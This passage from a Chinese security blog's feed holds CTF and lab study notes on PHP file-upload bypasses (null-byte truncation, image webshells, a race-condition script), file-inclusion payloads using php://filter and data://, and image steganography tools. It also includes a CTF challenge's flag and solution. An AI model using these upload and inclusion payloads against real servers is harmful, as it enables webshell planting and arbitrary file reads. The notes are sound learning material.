class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p>理解： /?filename=111.txt 正常解析是txt，而/?filename=111.php%00.txt<br>最后上传后的解析的就是111.php</p><p>$img_path是直接拼接的，所以可以用00截断绕过</p><p>**截断条件：1.php版本小于5.3.4 **</p><p>​      <strong>2.php的magic_quotes_gpc为OFF状态</strong></p><p>所以我们抓包后在save_path里改路径即可，如下图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f525ba927d2.jpg"></p><p>但由于php版本问题，这两个漏洞都无法复现成功</p><h2 id="upload-labs-12（00截断）"><a href="#upload-labs-12（00截断）" class="headerlink" title="upload-labs 12（00截断）"></a>upload-labs 12（00截断）</h2><p>这里的00截断为post请求，所以我们抓包以后在十六进制里改就好啦！</p><p>但由于php版本问题，这两个漏洞都无法复现成功</p><h2 id="upload-labs-13（图片马）"><a href="#upload-labs-13（图片马）" class="headerlink" title="upload-labs 13（图片马）"></a>upload-labs 13（图片马）</h2><p>可以看到代码中只检测文件头的2字节内容，所以我们将文件的头两个字节修改为图片的格式就可以绕过</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f529f47461e.jpg"></p><h3 id="方法1：制作gif马"><a href="#方法1：制作gif马" class="headerlink" title="方法1：制作gif马"></a>方法1：制作gif马</h3><p> 因为只检测前两个字节，所以我们只要在php代码前加入gif的文件头即可，也就是加入 GIF98a</p><p><code>GIF89a &lt;?php phpinfo();?&gt;</code></p><p>然后直接上传即可，但本题需要使用文件包含来执行代码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f53119c15d9.jpg"></p><p>打开网站 在url中输入我们上传gif的路径即可 </p><p>使用GET传参 <code>?file=upload/8620210719080601.gif</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f531b223e5b.jpg"></p><p>如下图，可以看到执行成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f532aaa39a1.jpg"></p><h3 id="方法2：制作jpg，png马"><a href="#方法2：制作jpg，png马" class="headerlink" title="方法2：制作jpg，png马"></a>方法2：制作jpg，png马</h3><p>emmm方法也有两种，一种是 <code>copy 22.jpg /b + 1.php /a shell.jpg</code></p><p>而我的方法是在jpg图片的末尾处插入php执行代码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f533c8545e7.jpg"></p><p>这样后端会判断这是一张jpg图片，而当我们文件包含时，php代码就被执行了</p><p>如下图 phpinfo的页面已显示出来</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/ea59b470e213e172.png"></p><h2 id="upload-labs-14（图片马）"><a href="#upload-labs-14（图片马）" class="headerlink" title="upload-labs 14（图片马）"></a>upload-labs 14（图片马）</h2><p>这题多了一个函数<strong>getimagesize()</strong></p><p>但是整体好像没什么区别 用13题的做法还是能出来</p><p>pass15也是一样的做法hhhhh，我感觉就是加了个函数验证，做法都一样的</p><h2 id="upload-labs-17（条件竞争）"><a href="#upload-labs-17（条件竞争）" class="headerlink" title="upload-labs 17（条件竞争）"></a>upload-labs 17（条件竞争）</h2><p>这题理解了很久，以下是源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f6223d6ee82.jpg"></p><p>结合网上和自己的审计，大概理解如下：</p><p>可以看到有一个unlink函数，是一个删除函数，意思是当我们进行文件上传时，会先将文件传至服务器，判断我们的文件合不合法，如果不合法则删除它，但是这中间可以有一个时间差，如果我们上传的比服务器删的快，那么我们就可以达到代码执行的目的</p><p>所以我们只要抓包后将php代码一直执行，一直发包，然后用脚本来判断是否成功，成功则用蚁剑连接</p><p>如下图，我们进行抓包，然后右键爆破</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/fab630887e071a63.png"></p><p>选择我们需要爆破的东西，这里当然是这句php语句了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/7ef1dfcfd0e0fe68.png"></p><p>这里我们选择，一直发包的设置</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/5f0b091d2a7da2bf.png"></p><p>然后准备python脚本，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9b5df420-7c50-4c2c-ad93-117aa129ac4c.node4.buuoj.cn/upload/11.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:/检测回响值为<span class="number">200</span>的，也就是上传成功的页面</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在burp里开始攻击，同时python也同时运行</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/bf65c7989c76e208.png"></p><p>如下图显示成功了：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/f41a1b486ab2635c.png"></p><p>然后我们用蚁剑进行连接</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/f859b0d553933839.png"></p><p>连接成功，拿到权限</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/902ad28f9a31638c.png"></p>]]></content>
    
    
      
      
    <summary type="html"> &lt;h1 align = &quot;center&quot;&gt;文件上传学习笔记&lt;/h1&gt;



&lt;h2 id=&quot;文件上传常用函数&quot;&gt;&lt;a href=&quot;#文件上传常用函数&quot; class=&quot;headerlink&quot; title=&quot;文件上传常用函数&quot;&gt;&lt;/a&gt;文件上传常用函数&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;</summary>
      
    
    
    
    <category term="-Web" scheme="https://abinix.top/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含笔记</title>
    <link href="https://abinix.top/2021/07/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/07/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</id>
    <published>2021-07-30T13:11:34.000Z</published>
    <updated>2021-08-12T16:27:22.766Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">文件包含笔记</h1><p>[TOC]</p><p>用一张图概括文件包含</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729221645.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729221649.png"></p><h1 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h1><blockquote><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。</p><p>什么叫<strong>包含</strong>呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。</p></blockquote><p>此文件，例如 include “conn.php”。php常见的<strong>文件包含函数</strong>：</p><pre><code>include &quot;conn.php&quot;: 当包含文件出现错误时，发出错误信息，继续执行include_once &quot;conn.php&quot;：只包含一次require &quot;conn.php&quot;： 当包含出现错误时，发出错误信息，不再执行require_once &quot;conn.php&quot;：只包含一次</code></pre><h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>​    能够读取或执行包含本地文件的漏洞，称为本地文件包含漏洞</p><h2 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h2><p>举个很简单的例子来解释文件包含</p><p>在本地创建一个php文件，内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码的意思就是 包含了一个由get请求得到的东西，我们再创建一个php文件来显示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用于显示phpinfo页面</p><p>打开浏览器，进入本地文件夹，<strong>get一个值为phpinfo.php的文件</strong>，也就是使它包含我们刚刚写好的phpinfo.php</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729181623.png"></p><p>如上图，成功本地包含文件，这就构成了文件包含的漏洞</p><p>如下图，我们将phpinfo.php内容改为 hello i’m zhaobin</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729181759.png"></p><p>也能成功解析</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729181831.png"></p><p>也可以读取一些系统本地的敏感信息，使用绝对路径，如下图，成功读取</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729210433.png"></p><h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><blockquote><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞</p><p>allow_url_fopen = On（是否允许打开远程文件）</p></blockquote><p>这里改php.ini文件即可</p><p>如下图，我们再本地环境下创建一个1.txt（就是我们要进行包含的文件）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729224453.png"></p><p>通过test包含，paylod为 <code>?test=http://127.0.0.1/1.txt</code>，效果如下</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729224716.png"></p><p>成功远程包含，输出txt</p><h1 id="利用方式（伪协议）"><a href="#利用方式（伪协议）" class="headerlink" title="利用方式（伪协议）"></a>利用方式（伪协议）</h1><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时<strong>post</strong>想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729222209.png"></p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>php://filter可以<strong>获取指定文件源码</strong>。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p><p>例：payload：<code>?test=php://filter/convert.base64-encode/resource=phpinfo.php</code></p><p>意思就是将php源码，以base64的方式呈现出来</p><p>![image-20210729222435423](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210729222435423.png)</p><p>解码得到</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729222455.png"></p><p>这就是我phpinfo.php里的内容</p><h2 id="data-与phar"><a href="#data-与phar" class="headerlink" title="data://与phar://"></a>data://与phar://</h2><p>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729223318.png"></p><p>例如：payload:<code>?test=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729224205.png"></p><p>成功包含，显示phpinfo画面，PD9waHAgcGhwaW5mbygpOw==解码后为<code>&lt;?php phpinfo();</code>代码</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h2><p>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p><p>ps：zip://中只能传入文件的绝对地址</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729230026.png"></p><h1 id="漏洞成因与防御方法"><a href="#漏洞成因与防御方法" class="headerlink" title="漏洞成因与防御方法"></a>漏洞成因与防御方法</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><blockquote><p>在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。最常见的就属于本地文件包含（Local File Inclusion）漏洞了。</p><p>程序开发人员一般希望代码更灵活，也更加方便，所以将被包含的文件设置为变量，用来进行动态调用，<br>但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p></blockquote><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ol><li><p>针对远程文件包含可<strong>关闭</strong>url包含功能( php.ini:allow_url_include=off )</p></li><li><p>针对本地文件包含可以设置白名单,过滤危险字符(比如.和/)</p></li><li><p><strong>白名单限制包含文件</strong>，并设置过滤，尽可能的多过滤，使攻击者无法正常的包含文件</p></li></ol><p>1，2也是最直接的方法，一劳永逸</p><h3 id="有限制远程文件包含漏洞绕过"><a href="#有限制远程文件包含漏洞绕过" class="headerlink" title="有限制远程文件包含漏洞绕过"></a>有限制远程文件包含漏洞绕过</h3><p>先看代码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729232127.png"></p><p>多添加了html后缀，导致远程包含的文件也会多一个html后缀。</p><p>这就是文件包含的过滤，但我们同样有绕过</p><p>过滤方法有 <strong>1.问号绕过 2.空格绕过 3.#号绕过</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729232457.png"></p><h3 id="CTF赛题"><a href="#CTF赛题" class="headerlink" title="CTF赛题"></a>CTF赛题</h3><p>是一道南京邮电大学的赛题，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$_GET</span>[file])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我们可以看到关键代码 <code>include($file)</code>可知是文件包含题目，我们使用get传参即可</p><p>并且源码中有 <code>if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))</code>所以这题有限制，对data、input伪协议及../进行了过滤，但其实绕过方法有很多，我们可以用filter伪协议来解</p><p>所以payload就很简单了： <code>?file=php://filter/read=convert.base64-encode/resource=./index.php</code></p><p>成功包含</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;文件包含笔记&lt;/h1&gt;

&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;用一张图概括文件包含&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210729221645.</summary>
      
    
    
    
    <category term="-Web" scheme="https://abinix.top/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>Misc学习笔记</title>
    <link href="https://abinix.top/2021/07/17/MISC%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/07/17/MISC%E7%AC%94%E8%AE%B0/</id>
    <published>2021-07-17T13:11:34.000Z</published>
    <updated>2021-09-13T02:20:58.997Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">Misc学习笔记</h1><h2 id="😺图片隐写"><a href="#😺图片隐写" class="headerlink" title="😺图片隐写"></a>😺图片隐写</h2><ul><li><h3 id="🎈Exif信息隐藏"><a href="#🎈Exif信息隐藏" class="headerlink" title="🎈Exif信息隐藏"></a>🎈Exif信息隐藏</h3><ul><li><h4 id="Exif是什么？"><a href="#Exif是什么？" class="headerlink" title="Exif是什么？"></a>Exif是什么？</h4><blockquote><p>​        Exif就是用来记录拍摄图像时的各种信息：图像信息（厂商，分辨率等），相机拍摄记（ISO，白平衡，饱和度，锐度等），缩略图（缩略图宽度，高度等），gps（拍摄时的经度，纬度，高度）等，将这些信息按照JPEG文件标准放在图像文件头部。</p></blockquote></li></ul></li></ul><table><tr><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ac229d5c2.jpg"></td><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ac22bfffe.jpg"></td></tr></table><p>​            如上图上述的信息都可以隐藏信息，我们可以通过<strong>右键属性</strong>，<strong>查看详细信息</strong>，也可以通过<a href="https://exif.tuchong.com/">https://exif.tuchong.com/</a> 在线exif中查看</p><ul><li><h3 id="🎈图片修复式隐写"><a href="#🎈图片修复式隐写" class="headerlink" title="🎈图片修复式隐写"></a>🎈图片修复式隐写</h3><ul><li><p>此隐写可分为<strong>图片头修复</strong>、<strong>图片尾修复</strong>、<strong>长宽高修复</strong></p></li><li><h4 id="文件头文件尾总结"><a href="#文件头文件尾总结" class="headerlink" title="文件头文件尾总结"></a>文件头文件尾总结</h4><blockquote><p>JPEG (jpg)，            文件头:FFD8FF　　文件尾: FFD9　　　　　　　　　　　　　　　<br>PNG (png)，           文件头:89504E470D0A1A0A　文件尾:AE 42 60 82<br>GIF (gif)，               文件头:47494638　文件尾:00 3B             </p><p>ZIP Archive (zip)， 文件头:504B0304　文件尾：50 4B</p><p>TIFF (tif)，               文件头:49492A00　<br>Windows Bitmap (bmp)，      文件头：424D<br>CAD (dwg)，           文件头：41433130<br>Adobe Photoshop (psd)，      文件头：38425053　<br>Rich Text Format (rtf)，           文件头：7B5C727466　<br>XML (xml)，                             文件头：3C3F786D6C　<br>HTML (html)，                          文件头：68746D6C3E<br>Email [thorough only] (eml)，   文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，           文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                         文件头：2142444E<br>MS Word/Excel (xls.or.doc)，    文件头：D0CF11E0<br>MS Access (mdb)，                   文件头：5374616E64617264204A<br>WordPerfect (wpd)，                 文件头：FF575043<br>Adobe Acrobat (pdf)，              文件头：255044462D312E<br>Quicken (qdf)，                         文件头：AC9EBD8F<br>Windows Password (pwl)，      文件头：E3828596</p><p>RAR Archive (rar)，                   文件头：52617221<br>Wave (wav)，                           文件头：57415645<br>AVI (avi)，                                 文件头：41564920<br>Real Audio (ram)，                   文件头：2E7261FD<br>Real Media (rm)，                    文件头：2E524D46<br>MPEG (mpg)，                        文件头：000001BA<br>MPEG (mpg)，                        文件头：000001B3<br>Quicktime (mov)，                  文件头：6D6F6F76<br>Windows Media (asf)，           文件头：3026B2758E66CF11<br>MIDI (mid)，                            文件头：4D546864</p></blockquote></li><li><h4 id="图片头尾修复"><a href="#图片头尾修复" class="headerlink" title="图片头尾修复"></a>图片头尾修复</h4><p>在一些ctf题目中，出题人会把图片的<strong>文件头或是文件尾去掉</strong>，这时我们就要<strong>手动添加</strong>文件头，尾。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7edad6ecec.jpg"></p><p>如图，我们加上文件头后即可查看图片</p></li><li><h4 id="长宽高修复"><a href="#长宽高修复" class="headerlink" title="长宽高修复"></a>长宽高修复</h4><p>一般会有一些信息隐藏在图片的下面，但由于图片<strong>高度限定</strong>，导致我们看不见，这时我们便可以通过<strong>更改宽高</strong>的方法进行修复。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ba0f3a417.jpg"></p><p>如上图我们更改图片的高度</p><p>在 unit32 height 中修改高度，改的高一点即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ba0a06d5d.jpg"></p><p>于是flag就出来了</p></li></ul></li><li><h3 id="🎈隐藏信息到十六进制区域"><a href="#🎈隐藏信息到十六进制区域" class="headerlink" title="🎈隐藏信息到十六进制区域"></a>🎈隐藏信息到十六进制区域</h3><ul><li><p>因为在<strong>文件尾添加一串编码</strong>并不会影响显示，所以一些赛题会采用这样的方式隐藏</p></li><li><p>或者会把flag藏到文本里，这时我们 <strong>ctrl+f</strong> 进行搜索即可。</p></li></ul><table><tr><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e82b2a8383f.jpg"></td><table></li><li><p>如上图，我们用010打开后发现文件尾有一串编码，分析后得知该编码为<strong>Unicode</strong></p><p>我们用在线网站 <a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a> </p><p>即可得到flag</p></li><li><h3 id="🎈LSB隐写"><a href="#🎈LSB隐写" class="headerlink" title="🎈LSB隐写"></a>🎈LSB隐写</h3><ul><li><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote><p>LSB全称为 least significant bit，是最低有效位的意思。Lsb图片隐写是基于lsb算法的一种图片隐写术。机器并不是通过像素识别，而是通过该像素点的数值大小识别，所以在人类眼中一样的，在机器那不一样。一个像素点占8位，每位有3个颜色，每个像素点能隐藏3个信息。</p><p>所以低有效位的数据改变在人眼看来是一样的，<strong>所以在最后一位隐藏数据是一个有效的方法。</strong></p></blockquote></li><li><p>对于lsb隐写 我们用<strong>Stegsolve.jar</strong>工具查看即可</p><p>打开点击Stegsolve.jar工具 点击 Analyse 再点击 Data Extract</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7f1b2f1f11.jpg"></p><p>因为是LSB，<strong>利用最低有效位</strong>，所以我们将<strong>RGB的色素</strong>都调为0 </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7f274792a6.jpg"></p><p>即可得到一些信息</p></li></ul></li><li><h3 id="🎈Jphide隐写"><a href="#🎈Jphide隐写" class="headerlink" title="🎈Jphide隐写"></a>🎈Jphide隐写</h3><ul><li><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><blockquote><p>Jphide是基于最低有效位LSB的<strong>JPEG</strong>格式图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法有较强的抗统计检测能力。</p></blockquote></li><li><p>我们采用<strong>JPHS</strong>软件解密（用于对 JPEG 文件进行 Jhide 算法的隐写或提取）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7f909852ff.jpg"></p><p>点击hide 输入对应密码即可解密。（有些也可不输）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9292791efb.jpg"></p><p>输入完毕则会在桌面上创建一个文件。内容则是隐藏的信息</p></li></ul></li><li><h3 id="🎈outguess隐写"><a href="#🎈outguess隐写" class="headerlink" title="🎈outguess隐写"></a>🎈outguess隐写</h3><ul><li><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><blockquote><p>Outgusee算法是Niels Provos针对Jsteg算法的缺陷提出的一种方法：</p><p>对应的，也有针对该算法的隐写工具，名字也叫Outguess。</p></blockquote></li><li><h4 id="安装outguess"><a href="#安装outguess" class="headerlink" title="安装outguess"></a>安装outguess</h4><ol><li><p>Kail终端命令输入<code>git clone https://github.com/crorvick/outguess</code></p></li><li><p>下载完毕进入outguess文件夹中</p></li><li><p>在终端中输入<code>./configure &amp;&amp; make &amp;&amp; make install</code> 即可安装</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e963ed73b0a.jpg"></p></li></ol><p>如上图已经安装完毕，输入<strong>outguess</strong>可查看指令</p><ul><li><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p><code>outguess -r “图片位置” -t 11.txt</code></p><p>其中 r 为解密指令</p><p>11.txt 为导出的文件</p><p>如下图为成功结果</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c9adf0b5d.jpg"></p></li></ul></li><li><h3 id="🎈F5隐写"><a href="#🎈F5隐写" class="headerlink" title="🎈F5隐写"></a>🎈F5隐写</h3><blockquote><p>F5隐写全称F5-steganography，</p><p>在kail系统命令端输入以下代码来下载：</p><p><code>git clone https://github.com/matthewgao/F5-steganography</code></p></blockquote></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e96bb308de3.jpg"></p><p>​        如图：可以看到左边生成了一个名为F5的文件包</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e96f66dd6b0.jpg"></p><p>​        结果一看 使用不了，<strong>需要java环境</strong>，那好吧 整一个。</p><ul><li><h4 id="配置java环境"><a href="#配置java环境" class="headerlink" title="配置java环境"></a>配置java环境</h4><ul><li><p>去java官网下载jdk，然后粘贴到虚拟机中  <a href="https://www.oracle.com/java/technologies/javase-jdk16-downloads.html">https://www.oracle.com/java/technologies/javase-jdk16-downloads.html</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9b2e04e267.jpg"></p></li><li><p><strong>因为kali自带的java版本是Openjdk，因此需要卸载，在终端中输入命令</strong><code>apt-get remove openjdk*</code></p></li><li><p>将不再需要的<strong>java软件卸载</strong>，输入命令：<code>apt autoremove</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9b4366e8cb.jpg"></p></li></ul><ul><li><p>然后<strong>解压缩并移动至/opt文件夹</strong></p><blockquote><p><code>cp jdk-16.0.1_linux-x64_bin.tar.gz /opt</code>将压缩包移动至/opt文件夹</p><p><code>tar -xvzf jdk-16.0.1_linux-x64_bin.tar.gz</code>将压缩包解压至当前文件夹</p><p><code>cd jdk-16.0.1</code>进入解压好的文件夹</p></blockquote></li><li><p><strong>设置环境变量</strong>  <code>vi  /etc/profile</code> </p><p>并在尾部加入如下信息</p><blockquote><p>#install JAVA JDK</p><p>export JAVA_HOME=/opt/jdk-16.0.1</p><p>export CLASSPATH=.:${JAVA_HOME}/lib</p><p>export PATH=${JAVA_HOME}/bin:$PATH </p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9bbf1c1ec9.jpg"></p></li><li><p>接下来<strong>安装并注册</strong> 依次输入下列命令</p><blockquote><p>update-alternatives –install /usr/bin/java java /opt/jdk-16.0.1/bin/java 1<br>update-alternatives –install /usr/bin/javac javac /opt/jdk-16.0.1/bin/javac 1<br>update-alternatives –set java /opt/jdk-16.0.1/bin/java<br>update-alternatives –set javac /opt/jdk-16.0.1/bin/javac</p></blockquote></li><li><p>完毕后，输入<code> java -version</code>查看是否安装完毕，如果出现以下结果则表示安装完毕</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9bba29d530.jpg"></p></li></ul></li><li><h4 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h4><ol><li><p>cd到安装目录下</p></li><li><p>输入<code>java Extract “待提取的图片路径”</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c44f0b4e4.jpg"></p><p>还是出现了错误 </p><h5 id="心态炸了🧨"><a href="#心态炸了🧨" class="headerlink" title="心态炸了🧨"></a>心态炸了🧨</h5><p>网上一查发现是因为我<strong>jdk版本太高而在较低版本的文件下运行造成的</strong> </p><h5 id="靠🧨"><a href="#靠🧨" class="headerlink" title="靠🧨"></a>靠🧨</h5><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c49fc3b20.jpg"></p><p>行吧，那我在<strong>windows</strong>里下，windows里jdk版本<strong>低</strong>，好趴</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c50679296.jpg"></p><p>输入<code>java Extract 